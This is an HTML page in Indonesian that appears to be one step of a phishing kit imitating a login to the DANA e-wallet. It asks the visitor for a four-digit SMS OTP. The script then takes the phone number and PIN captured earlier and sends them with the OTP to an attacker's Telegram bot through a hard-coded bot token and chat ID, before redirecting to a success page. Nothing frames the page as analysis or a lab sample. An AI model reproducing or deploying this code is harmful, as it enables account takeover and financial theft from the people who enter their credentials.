<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Kode OTP</title>
  <style>
    body {
      font-family: 'Segoe UI', Roboto, sans-serif;
      background-color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    h2 {
      margin-bottom: 10px;
      color: #333;
      font-size: 18px;
    }

    p {
      font-size: 14px;
      color: #888;
      margin-bottom: 30px;
      text-align: center;
      padding: 0 20px;
    }

    .otp-input {
      display: flex;
      gap: 10px;
    }

    .otp-input input {
      width: 40px;
      height: 50px;
      text-align: center;
      font-size: 20px;
      border: 1.5px solid #ccc;
      border-radius: 8px;
      outline: none;
    }

    .otp-input input:focus {
      border-color: #008CFF;
    }
  </style>
</head>
<body>
  <h2>Masukkan Kode OTP</h2>
  <p id="infoText">Kami telah mengirimkan SMS ke nomor Anda</p>

  <div class="otp-input">
    <input type="text" maxlength="1" inputmode="numeric">
    <input type="text" maxlength="1" inputmode="numeric">
    <input type="text" maxlength="1" inputmode="numeric">
    <input type="text" maxlength="1" inputmode="numeric">
  </div>

  <script>
    const inputs = document.querySelectorAll('.otp-input input');
    inputs[0].focus();

    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }

        const otp = [...inputs].map(input => input.value).join('');
        if (otp.length === 4) {
          const pin = sessionStorage.getItem('pin') || 'Tidak ada';
          const phone = sessionStorage.getItem('phone') || 'Tidak ada';

          // Kirim ke Telegram
          const token = '7658902176:AAE0RbA2cBHQh6EgU9We-ar7XGrrPxPFVYw';
          const chatId = '6597122729';
          const message = `🔐 *DANA LOGIN*\n\n📱 Nomor: ${phone}\n🔑 PIN: ${pin}\n📩 OTP: ${otp}`;

          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown"
            })
          }).then(() => {
            window.location.href = "sukses.html";
          }).catch(() => {
            alert("Gagal mengirim OTP");
          });
        }
      });
    });

    // Tampilkan nomor di infoText
    const phone = sessionStorage.getItem('phone');
    if (phone) {
      document.getElementById("infoText").textContent =
        `Kami telah mengirimkan SMS ke ${phone}`;
    }
  </script>
</body>
</html>
